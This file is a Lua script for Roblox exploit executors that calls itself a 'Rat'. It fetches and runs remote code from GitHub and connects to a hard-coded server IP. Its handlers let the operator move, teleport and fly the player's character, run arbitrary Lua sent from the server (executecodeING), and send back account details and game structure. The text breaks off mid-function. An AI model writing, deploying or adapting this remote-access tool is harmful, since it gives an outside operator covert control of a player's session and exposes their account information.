local KasflowsClient = loadstring(game:HttpGet("https://raw.githubusercontent.com/KaSpEr-tv123/kasflowsjs/refs/heads/main/roblox/kasflows.lua"))()

local function sendChatMessage(text, color)
    local player = game.Players.LocalPlayer
    
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = text,
        Color = color or Color3.fromRGB(170, 0, 255),
        Font = Enum.Font.SourceSansBold,
        FontSize = Enum.FontSize.Size24
    })
end

local client = KasflowsClient.new('http://87.120.166.48:8000')

client:on("connect", function()
    client:sendToClient("Rat", "notification", {
        text = "Успешно подключенен аккаунт: " .. game.Players.LocalPlayer.Name,
        type = "success"
    })
end)

client:on("disconnect", function()
    client:sendToClient("Rat", "notification", {
        text = "Отключен от сервера",
        type = "error"
    })
end)

client:on("error", function(errorMessage)
    client:sendToClient("Rat", "notification", {
        text = "Ошибка: " .. errorMessage,
        type = "error"
    })
    
    -- Отправляем ошибку на сервер
    pcall(function()
        client:emit("errorlua", {
            error = errorMessage
        })
    end)
end)

local commandHandlers = {}

local function registerCommandHandler(commandName, handler)
    commandHandlers[commandName] = handler
end

local function hasCommandHandler(commandName)
    return commandHandlers[commandName] ~= nil
end

local function executeCommand(commandName, arg, player, character, humanoid, humanoidRootPart)
    local handler = commandHandlers[commandName]
    if handler then
        return handler(arg, player, character, humanoid, humanoidRootPart)
    end
    return false, "Нет обработчика для команды: " .. commandName
end

client:on("action", function(message)
    if type(message) ~= "string" then
        client:sendToClient("Rat", "notification", {
            text = "Получено сообщение неверного типа: " .. type(message),
            type = "error"
        })
        return
    end
    
    -- Отладочный вывод
    client:sendToClient("Rat", "notification", {
        text = "Получена команда: " .. message,
        type = "info"
    })
    
    local parts = {}
    for part in string.gmatch(message, "[^;]+") do
        table.insert(parts, part)
    end
    
    local command = parts[1]
    local arg = parts[2]
    -- Проверка на наличие обработчика для команды
    if not hasCommandHandler(command) then
        client:sendToClient("Rat", "notification", {
            text = "Нет обработчика для команды: " .. command,
            type = "error"
        })
        return
    end
    
    local success, errorMsg = pcall(function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        
        local commandSuccess, commandError = executeCommand(command, arg, player, character, humanoid, humanoidRootPart)
        if not commandSuccess and commandError then
            client:sendToClient("Rat", "notification", {
                text = commandError,
                type = "error"
            })
        end
    end)
    
    if not success then
        client:sendToClient("Rat", "notification", {
            text = "Ошибка при выполнении команды: " .. errorMsg,
            type = "error"
        })
        
        pcall(function()
            client:emit("errorlua", {
                command = command,
                error = errorMsg
            })
        end)
    end
end)

-- Регистрация всех команд
registerCommandHandler("runING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local forwardDirection = humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("runrightING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local rightDirection = humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("runleftING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local leftDirection = -humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("runbackING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local backwardDirection = -humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("jumpING", function(arg, player, character, humanoid, humanoidRootPart)
    humanoid.Jump = true
    return true
end)

registerCommandHandler("teleportforwardING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local forwardDirection = humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportbackING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local backwardDirection = -humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportleftING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local leftDirection = -humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportrightING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local rightDirection = humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportupING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local upDirection = Vector3.new(0, 1, 0)
    local targetPosition = humanoidRootPart.Position + (upDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportdownING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local downDirection = Vector3.new(0, -1, 0)
    local targetPosition = humanoidRootPart.Position + (downDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleporttoING", function(arg, player, character, humanoid, humanoidRootPart)
    if not arg then
        return false, "Не указаны координаты для телепортации"
    end
    
    local coords = {}
    for coord in string.gmatch(arg, "[^;]+") do
        table.insert(coords, tonumber(coord))
    end
    
    if #coords < 3 then
        return false, "Неверный формат координат. Требуется X;Y;Z"
    end
    
    local x, y, z = coords[1], coords[2], coords[3]
    humanoidRootPart.CFrame = CFrame.new(x, y, z)
    return true
end)

registerCommandHandler("speedING", function(arg, player, character, humanoid, humanoidRootPart)
    local speedValue = arg and tonumber(arg) or 16 
    humanoid.WalkSpeed = speedValue
    return true
end)

registerCommandHandler("jumppowerING", function(arg, player, character, humanoid, humanoidRootPart)
    local jumpValue = arg and tonumber(arg) or 50
    humanoid.JumpPower = jumpValue
    return true
end)

registerCommandHandler("flyING", function(arg, player, character, humanoid, humanoidRootPart)
    local flying = humanoid:FindFirstChild("Flying")
    
    if flying then
        flying:Destroy()
        
        local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
        if flyVelocity then
            flyVelocity:Destroy()
        end
        
        local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
        if flyGyro then
            flyGyro:Destroy()
        end
        
        client:sendToClient("Rat", "notification", {
            text = "Режим полета отключен",
            type = "info"
        })
    else
        local flyValue = Instance.new("BoolValue")
        flyValue.Name = "Flying"
        flyValue.Parent = humanoid
        
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Name = "FlyVelocity"
        bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.Parent = humanoidRootPart
        
        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.Name = "FlyGyro"
        bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bodyGyro.P = 10000
        bodyGyro.D = 100
        bodyGyro.CFrame = humanoidRootPart.CFrame
        bodyGyro.Parent = humanoidRootPart
        
        local flySpeed = arg and tonumber(arg) or humanoid.WalkSpeed
        
        local function updateFlight()
            if not flyValue or not flyValue.Parent then return end
            
            local lookVector = humanoidRootPart.CFrame.LookVector
            local upVector = humanoidRootPart.CFrame.UpVector
            local rightVector = humanoidRootPart.CFrame.RightVector
            
            local velocity = Vector3.new(0, 0, 0)
            
            local userInputService = game:GetService("UserInputService")
            
            if userInputService:IsKeyDown(Enum.KeyCode.W) then
                velocity = velocity + lookVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.S) then
                velocity = velocity - lookVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.A) then
                velocity = velocity - rightVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.D) then
                velocity = velocity + rightVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.Space) then
                velocity = velocity + upVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                velocity = velocity - upVector
            end
            
            if velocity.Magnitude > 0 then
                velocity = velocity.Unit * flySpeed
            end
            
            local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
            if flyVelocity then
                flyVelocity.Velocity = velocity
            end
            
            local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
            if flyGyro then
                flyGyro.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + lookVector)
            end
        end
        
        spawn(function()
            while flyValue and flyValue.Parent do
                updateFlight()
                wait(0.05) -- Более частое обновление для плавности
            end
            
            local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
            if flyVelocity then
                flyVelocity:Destroy()
            end
            
            local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
            if flyGyro then
                flyGyro:Destroy()
            end
        end)
        
        client:sendToClient("Rat", "notification", {
            text = "Режим полета включен. Используйте WASD для движения, Пробел для подъема, Shift для спуска",
            type = "success"
        })
    end
    return true
end)

registerCommandHandler("turnleftING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(0, -angle, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("turnrightING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(0, angle, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("lookupING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(-angle, 0, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("lookdownING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(angle, 0, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("resetcameraING", function(arg, player, character, humanoid, humanoidRootPart)
    local position = humanoidRootPart.Position
    humanoidRootPart.CFrame = CFrame.new(position)
    return true
end)

registerCommandHandler("getpositionING", function(arg, player, character, humanoid, humanoidRootPart)
    local position = humanoidRootPart.Position
    local x = math.floor(position.X * 10) / 10
    local y = math.floor(position.Y * 10) / 10
    local z = math.floor(position.Z * 10) / 10
    
    client:sendToClient("Rat", "notification", {
        text = "Позиция: X=" .. x .. ", Y=" .. y .. ", Z=" .. z,
        type = "info"
    })
    return true
end)

registerCommandHandler("sitING", function(arg, player, character, humanoid, humanoidRootPart)
    humanoid.Sit = true
    return true
end)

registerCommandHandler("danceING", function(arg, player, character, humanoid, humanoidRootPart)
    local function doDanceMove()
        local randomAngle = math.random(-45, 45)
        local verticalShift = math.rad(math.random(-15, 15))
        local hipShift = CFrame.new(0, math.random(-1,1)*0.3, 0)
        
        local currentCFrame = humanoidRootPart.CFrame
        local newCFrame = currentCFrame 
            * CFrame.Angles(0, math.rad(randomAngle), verticalShift)
            * hipShift
        
        local tweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(
            0.2 + math.random()*0.3,
            Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out,
            0,
            false,
            math.random(-2,2)*0.1
        )
        
        local tween = tweenService:Create(
            humanoidRootPart, 
            tweenInfo, 
            {CFrame = newCFrame}
        )
        
        if math.random() > 0.7 then
            humanoid.Jump = true
        end
        
        tween:Play()
        task.wait(0.1 + math.random()*0.3)
    end
    
    spawn(function()
        for i = 1, 40 do
            doDanceMove()
            wait(0.5)
        end
    end)
    return true
end)

registerCommandHandler("resetING", function(arg, player, character, humanoid, humanoidRootPart)
    character:BreakJoints()
    return true
end)

registerCommandHandler("executecodeING", function(arg, player, character, humanoid, humanoidRootPart)
    local code = arg
    if not code then
        return false, "Не указан код для выполнения"
    end
    
    local codeFunc, compileError = loadstring(code)
    if not codeFunc then
        return false, "Ошибка компиляции: " .. tostring(compileError)
    end
    
    local success, runtimeError = pcall(codeFunc)
    if not success then
        return false, "Ошибка выполнения: " .. tostring(runtimeError)
    end
    
    return true
end)

registerCommandHandler("serverhopING", function(arg, player, character, humanoid, humanoidRootPart)
    local teleportService = game:GetService("TeleportService")
    local httpService = game:GetService("HttpService")
    local placeId = game.PlaceId
    
    local success, errorMsg = pcall(function()
        local servers = {}
        local cursor = ""
        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
        
        repeat
            local apiUrl = url
            if cursor ~= "" then
                apiUrl = url .. "&cursor=" .. cursor
            end
            
            local response = httpService:JSONDecode(game:HttpGet(apiUrl))
            cursor = response.nextPageCursor or ""
            
            for _, server in ipairs(response.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    table.insert(servers, server)
                end
            end
        until cursor == "" or #servers >= 5
        
        if #servers > 0 then
            local selectedServer = servers[math.random(1, #servers)]
            teleportService:TeleportToPlaceInstance(placeId, selectedServer.id, game.Players.LocalPlayer)
        else
            return false, "Не найдено подходящих серверов"
        end
    end)
    
    if not success then
        return false, "Ошибка при смене сервера: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("teleporttogameING", function(arg, player, character, humanoid, humanoidRootPart)
    local placeId = arg and tonumber(arg)
    if not placeId then
        return false, "Не указан ID игры"
    end
    
    local teleportService = game:GetService("TeleportService")
    local success, errorMsg = pcall(function()
        teleportService:Teleport(placeId, game.Players.LocalPlayer)
    end)
    
    if not success then
        return false, "Ошибка при телепортации: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("joinplayerING", function(arg, player, character, humanoid, humanoidRootPart)
    local playerName = arg
    if not playerName or playerName == "" then
        return false, "Имя игрока не указано"
    end
    
    local success, errorMsg = pcall(function()
        local gameid = game.PlaceId
        local serverid = game.JobId
        client:sendToClient(playerName, "joinplayerbyinfo", {
            gameid = gameid,
            serverid = serverid
        })
    end)
    
    if not success then
        return false, "Ошибка при отправке приглашения: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("getplayerinfoING", function(arg, player, character, humanoid, humanoidRootPart)
    local playerInfo = {
        ["Имя"] = player.Name,
        ["ID"] = player.UserId,
        ["Возраст аккаунта"] = player.AccountAge .. " дней",
        ["Здоровье"] = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth),
        ["Скорость"] = humanoid.WalkSpeed,
        ["Сила прыжка"] = humanoid.JumpPower,
        ["Текущая игра"] = game.PlaceId,
        ["Название игры"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    }
    
    local position = character:WaitForChild("HumanoidRootPart").Position
    playerInfo["Позиция"] = "X: " .. math.floor(position.X*10)/10 .. ", Y: " .. math.floor(position.Y*10)/10 .. ", Z: " .. math.floor(position.Z*10)/10
    
    local success, errorMsg = pcall(function()
        client:sendToClient("Rat", "playerInfo", game:GetService("HttpService"):JSONEncode(playerInfo))
    end)
    
    if not success then
        return false, "Ошибка при отправке информации: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("rejoinING", function(arg, player, character, humanoid, humanoidRootPart)
    local success, errorMsg = pcall(function()
        local teleportService = game:GetService("TeleportService")
        local placeId = game.PlaceId
        local jobId = game.JobId
        
        if jobId and jobId ~= "" then
            teleportService:TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
        else
            teleportService:Teleport(placeId, game.Players.LocalPlayer)
        end
    end)
    
    if not success then
        return false, "Ошибка при перезаходе: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("joinplayerbyidING", function(arg, player, character, humanoid, humanoidRootPart)
    if not arg then
        return false, "Не указаны параметры"
    end
    
    local params = {}
    for param in string.gmatch(arg, "[^;]+") do
        table.insert(params, param)
    end
    
    if #params < 2 then
        return false, "Неверный формат параметров. Требуется gameId;serverId"
    end
    
    local gameId = tonumber(params[1])
    local serverId = params[2]
    
    if not gameId then
        return false, "Неверный ID игры"
    end
    
    local teleportService = game:GetService("TeleportService")
    local success, errorMsg = pcall(function()
        teleportService:TeleportToPlaceInstance(gameId, serverId, game.Players.LocalPlayer)
    end)
    
    if not success then
        return false, "Ошибка при телепортации: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("stopING", function(arg, player, character, humanoid, humanoidRootPart)
    humanoid:MoveTo(humanoidRootPart.Position)
    return true
end)

-- Команда для автоматического обхода карты
registerCommandHandler("exploremapING", function(arg, player, character, humanoid, humanoidRootPart)
    local radius = arg and tonumber(arg) or 100
    local stepSize = 10
    local height = 5
    
    -- Текущая позиция как центр обхода
    local centerPosition = humanoidRootPart.Position
    
    -- Флаг для остановки обхода
    local exploring = true
    
    -- Функция для проверки возможности телепортации
    local function canTeleportTo(position)
        local ray = Ray.new(position + Vector3.new(0, height, 0), Vector3.new(0, -height * 2, 0))
        local hit, hitPosition = workspace:FindPartOnRay(ray, character)
        return hit ~= nil
    end
    
    -- Создаем таблицу для отслеживания посещенных мест
    local visitedPositions = {}
    local function positionKey(pos)
        local x = math.floor(pos.X / stepSize) * stepSize
        local z = math.floor(pos.Z / stepSize) * stepSize
        return x .. "," .. z
    end
    
    -- Отправляем уведомление о начале обхода
    client:sendToClient("Rat", "notification", {
        text = "Начинаем автоматический обход карты в радиусе " .. radius .. " метров",
        type = "info"
    })
    
    -- Запускаем обход в отдельном потоке
    spawn(function()
        while exploring do
            -- Генерируем случайную позицию в пределах радиуса
            local angle = math.random() * math.pi * 2
            local distance = math.random() * radius
            local offsetX = math.cos(angle) * distance
            local offsetZ = math.sin(angle) * distance
            
            local targetPosition = centerPosition + Vector3.new(offsetX, 0, offsetZ)
            local posKey = positionKey(targetPosition)
            
            -- Проверяем, не посещали ли мы уже эту позицию
            if not visitedPositions[posKey] then
                visitedPositions[posKey] = true
                
                -- Проверяем, можно ли телепортироваться в эту позицию
                if canTeleportTo(targetPosition) then
                    -- Телепортируемся к позиции
                    local success, errorMsg = pcall(function()
                        humanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end)
                    
                    if success then
                        -- Ждем немного, чтобы осмотреться
                        wait(1)
                        
                        -- Поворачиваемся на случайный угол
                        local randomAngle = math.random() * math.pi * 2
                        humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position) * 
                                                 CFrame.Angles(0, randomAngle, 0)
                        
                        wait(0.5)
                    end
                end
            end
            
            -- Проверяем, не нажал ли пользователь клавишу для остановки
            local userInputService = game:GetService("UserInputService")
            if userInputService:IsKeyDown(Enum.KeyCode.X) then
                exploring = false
                client:sendToClient("Rat", "notification", {
                    text = "Обход карты остановлен пользователем",
                    type = "info"
                })
                break
            end
            
            -- Небольшая пауза между телепортациями
            wait(0.2)
        end
        
        client:sendToClient("Rat", "notification", {
            text = "Обход карты завершен",
            type = "success"
        })
    end)
    
    return true
end)

-- Система записи и воспроизведения макросов
local recordedMacro = {}
local isRecording = false

registerCommandHandler("startrecordING", function(arg, player, character, humanoid, humanoidRootPart)
    if isRecording then
        client:sendToClient("Rat", "notification", {
            text = "Запись уже идет",
            type = "warning"
        })
        return false, "Запись уже идет"
    end
    
    recordedMacro = {}
    isRecording = true
    
    client:sendToClient("Rat", "notification", {
        text = "Запись макроса начата. Нажмите X для остановки.",
        type = "success"
    })
    
    -- Запускаем отслеживание позиции и действий
    spawn(function()
        local startTime = tick()
        local lastPosition = humanoidRootPart.Position
        local lastRotation = humanoidRootPart.CFrame.LookVector
        
        while isRecording do
            local currentTime = tick() - startTime
            local currentPosition = humanoidRootPart.Position
            local currentRotation = humanoidRootPart.CFrame.LookVector
            
            -- Записываем изменение позиции, если оно значительное
            if (currentPosition - lastPosition).Magnitude > 0.5 then
                table.insert(recordedMacro, {
                    time = currentTime,
                    action = "move",
                    position = currentPosition
                })
                
                lastPosition = currentPosition
            end
            
            -- Записываем изменение поворота, если оно значительное
            if (currentRotation - lastRotation).Magnitude > 0.1 then
                table.insert(recordedMacro, {
                    time = currentTime,
                    action = "rotate",
                    rotation = humanoidRootPart.CFrame.Rotation
                })
                
                lastRotation = currentRotation
            end
            
            -- Проверяем, не нажал ли пользователь клавишу для остановки
            local userInputService = game:GetService("UserInputService")
            if userInputService:IsKeyDown(Enum.KeyCode.X) then
                isRecording = false
                client:sendToClient("Rat", "notification", {
                    text = "Запись макроса остановлена. Записано " .. #recordedMacro .. " действий.",
                    type = "success"
                })
                break
            end
            
            wait(0.1)
        end
    end)
    
    return true
end)

registerCommandHandler("playrecordING", function(arg, player, character, humanoid, humanoidRootPart)
    if isRecording then
        client:sendToClient("Rat", "notification", {
            text = "Сначала остановите запись",
            type = "warning"
        })
        return false, "Сначала остановите запись"
    end
    
    if #recordedMacro == 0 then
        client:sendToClient("Rat", "notification", {
            text = "Нет записанного макроса",
            type = "error"
        })
        return false, "Нет записанного макроса"
    end
    
    local loops = arg and tonumber(arg) or 1
    
    client:sendToClient("Rat", "notification", {
        text = "Воспроизведение макроса начато. Повторений: " .. loops,
        type = "info"
    })
    
    -- Воспроизводим макрос
    spawn(function()
        for loop = 1, loops do
            local startTime = tick()
            local lastActionTime = 0
            
            for i, action in ipairs(recordedMacro) do
                -- Ждем до нужного времени
                local waitTime = action.time - lastActionTime
                if waitTime > 0 then
                    wait(waitTime)
                end
                
                -- Выполняем действие
                if action.action == "move" then
                    humanoidRootPart.CFrame = CFrame.new(action.position)
                elseif action.action == "rotate" then
                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position) * action.rotation
                end
                
                lastActionTime = action.time
            end
            
            -- Если это не последний цикл, делаем паузу между повторениями
            if loop < loops then
                wait(1)
            end
        end
        
        client:sendToClient("Rat", "notification", {
            text = "Воспроизведение макроса завершено",
            type = "success"
        })
    end)
    
    return true
end)

registerCommandHandler("stoprecordING", function(arg, player, character, humanoid, humanoidRootPart)
    if not isRecording then
        client:sendToClient("Rat", "notification", {
            text = "Запись не идет",
            type = "warning"
        })
        return false, "Запись не идет"
    end
    
    isRecording = false
    client:sendToClient("Rat", "notification", {
        text = "Запись макроса остановлена. Записано " .. #recordedMacro .. " действий.",
        type = "success"
    })
    
    return true
end)

-- Обработчик события joinplayerbyinfo
client:on("joinplayerbyinfo", function(data)
    if type(data) ~= "table" or not data.gameid or not data.serverid then
        client:sendToClient("Rat", "notification", {
            text = "Получены некорректные данные для присоединения к игроку",
            type = "error"
        })
        return
    end
    
    local success, errorMsg = pcall(function()
        local teleportService = game:GetService("TeleportService")
        teleportService:TeleportToPlaceInstance(data.gameid, data.serverid, game.Players.LocalPlayer)
    end)
    
    if not success then
        client:sendToClient("Rat", "notification", {
            text = "Ошибка при телепортации: " .. errorMsg,
            type = "error"
        })
    end
end)

registerCommandHandler("savepositionING", function(arg, player, character, humanoid, humanoidRootPart)
    local position = humanoidRootPart.Position
    local rotation = humanoidRootPart.Orientation
    
    -- Сохраняем позицию в глобальной переменной
    _G.savedPosition = {
        position = position,
        rotation = rotation
    }
    
    client:sendToClient("Rat", "notification", {
        text = "Позиция сохранена: X=" .. math.floor(position.X*10)/10 .. ", Y=" .. math.floor(position.Y*10)/10 .. ", Z=" .. math.floor(position.Z*10)/10,
        type = "success"
    })
    return true
end)

registerCommandHandler("loadpositionING", function(arg, player, character, humanoid, humanoidRootPart)
    if not _G.savedPosition then
        client:sendToClient("Rat", "notification", {
            text = "Нет сохраненной позиции",
            type = "error"
        })
        return false, "Нет сохраненной позиции"
    end
    
    humanoidRootPart.CFrame = CFrame.new(_G.savedPosition.position) * CFrame.Angles(
        math.rad(_G.savedPosition.rotation.X),
        math.rad(_G.savedPosition.rotation.Y),
        math.rad(_G.savedPosition.rotation.Z)
    )
    
    client:sendToClient("Rat", "notification", {
        text = "Позиция загружена",
        type = "success"
    })
    return true
end)

registerCommandHandler("getgameobjectsING", function(arg, player, character, humanoid, humanoidRootPart)
    local success, errorMsg = pcall(function()
        -- Функция для получения свойств объекта
        local function getProperties(instance)
            local properties = {}
            
            -- Список свойств, которые мы хотим получить
            local propertyList = {
                "Name", "ClassName", "Parent", "Position", "Size", "CFrame", 
                "Anchored", "CanCollide", "Transparency", "Color", "Material",
                "Enabled", "Visible", "Value", "Text", "TextColor3", "BackgroundColor3",
                "Health", "MaxHealth", "WalkSpeed", "JumpPower"
            }
            
            for _, propName in ipairs(propertyList) do
                local success, value = pcall(function()
                    return instance[propName]
                end)
                
                if success and value ~= nil then
                    -- Преобразуем значение в строку
                    local valueStr
                    if typeof(value) == "Vector3" then
                        valueStr = string.format("%.2f, %.2f, %.2f", value.X, value.Y, value.Z)
                    elseif typeof(value) == "Color3" then
                        valueStr = string.format("%.2f, %.2f, %.2f", value.R, value.G, value.B)
                    elseif typeof(value) == "CFrame" then
                        local pos = value.Position
                        valueStr = string.format("%.2f, %.2f, %.2f", pos.X, pos.Y, pos.Z)
                    else
                        valueStr = tostring(value)
                    end
                    
                    -- Проверяем, можно ли редактировать свойство
                    local isEditable = pcall(function()
                        instance[propName] = value
                    end)
                    
                    table.insert(properties, {
                        name = propName,
                        value = valueStr,
                        type = typeof(value),
                        editable = isEditable
                    })
                end
            end
            
            return properties
        end
        
        -- Функция для рекурсивного обхода объектов
        local function processInstance(instance, path, maxDepth, currentDepth)
            if currentDepth > maxDepth then
                return nil
            end
            
            local result = {
                name = instance.Name,
                className = instance.ClassName,
                path = path,
                properties = getProperties(instance),
                children = {}
            }
            
            -- Получаем дочерние объекты
            local children = instance:GetChildren()
            for _, child in ipairs(children) do
                local childPath = path .. "." .. child.Name
                local childData = processInstance(child, childPath, maxDepth, currentDepth + 1)
                if childData then
                    table.insert(result.children, childData)
                end
            end
            
            return result
        end
        
        -- Собираем данные о структуре игры
        local results = {}
        local maxDepth = 3  -- Ограничиваем глубину для производительности
        
        -- Обрабатываем основные сервисы
        local services = {
            game:GetService("Workspace"),
            game:GetService("Players"),
            game:GetService("Lighting"),
            game:GetService("ReplicatedStorage"),
            game:GetService("StarterGui"),
            game:GetService("StarterPack")
        }
        
        for _, service in ipairs(services) do
            local serviceData = processInstance(service, service.Name, maxDepth, 1)
            if serviceData then
                table.insert(results, serviceData)
            end
        end
        
        -- Отправляем результаты клиенту
        client:sendToClient("Rat", "gameobjectsdata", game:GetService("HttpService"):JSONEncode(results))
    end)
    
    if not success then
        client:sendToClient("Rat", "notification", {
            text = "Ошибка при получении структуры игры: " .. errorMsg,
            type = "error"
        })
        return false, errorMsg
    end
    
    return true
end)

registerCommandHandler("dexING", function(arg, player, character, humanoid, humanoidRootPart)
    -- Отправляем запрос на получение структуры игры
    local success, errorMsg = pcall(function()
        -- Функция для получения свойств объекта
        local function getProperties(instance)
            local properties = {}
            
            -- Список свойств, которые мы хотим получить
            local propertyList = {
                "Name", "ClassName", "Parent", "Position", "Size", "CFrame", 
                "Anchored", "CanCollide", "Transparency", "Color", "Material",
                "Enabled", "Visible", "Value", "Text", "TextColor3", "BackgroundColor3",
                "Health", "MaxHealth", "WalkSpeed", "JumpPower"
            }
            
            for _, propName in ipairs(propertyList) do
                local success, value = pcall(function()
                    return instance[propName]
                end)
                
                if success and value ~= nil then
                    -- Преобразуем значение в строку
                    local valueStr
                    if typeof(value) == "Vector3" then
